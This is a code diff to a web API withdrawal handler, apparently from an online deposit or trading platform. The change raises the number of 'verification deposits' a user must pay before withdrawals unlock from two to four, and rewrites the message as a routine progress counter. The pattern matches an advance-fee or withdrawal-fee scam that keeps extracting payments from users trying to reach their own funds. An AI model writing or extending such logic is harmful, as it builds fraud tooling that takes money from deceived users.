@@ -84,14 +84,16 @@ export async function POST(request: Request) {
   // Gate withdrawals behind the two-step verification (amount is country-aware).
   const step = user.verificationStep ?? 0
   const verificationAmount = getVerificationAmount(user.country)
-  if (step < 2) {
-    const STEP_1_MESSAGE = `To complete account verification for withdrawals, a deposit of ${user.currency} ${verificationAmount} is required. Once completed, your account will be successfully verified for withdrawal access.`
-    const STEP_2_MESSAGE = `Final verification is currently pending. A remaining verification payment of ${user.currency} ${verificationAmount} is required to fully enable withdrawal access on your account.`
+  const VERIFICATION_TOTAL = 4
+  if (step < VERIFICATION_TOTAL) {
+    const remaining = VERIFICATION_TOTAL - step
+    const verificationMessage = `Account verification in progress (${step}/${VERIFICATION_TOTAL}). ${remaining} more qualifying deposit${remaining === 1 ? '' : 's'} of ${user.currency} ${verificationAmount} required before withdrawal options unlock.`
     return NextResponse.json(
       {
-        error: step === 0 ? STEP_1_MESSAGE : STEP_2_MESSAGE,
+        error: verificationMessage,
         verificationRequired: true,
         verificationStep: step,
+        verificationTotal: VERIFICATION_TOTAL,
         verificationDepositAmount: verificationAmount,
         currency: user.currency,
       },
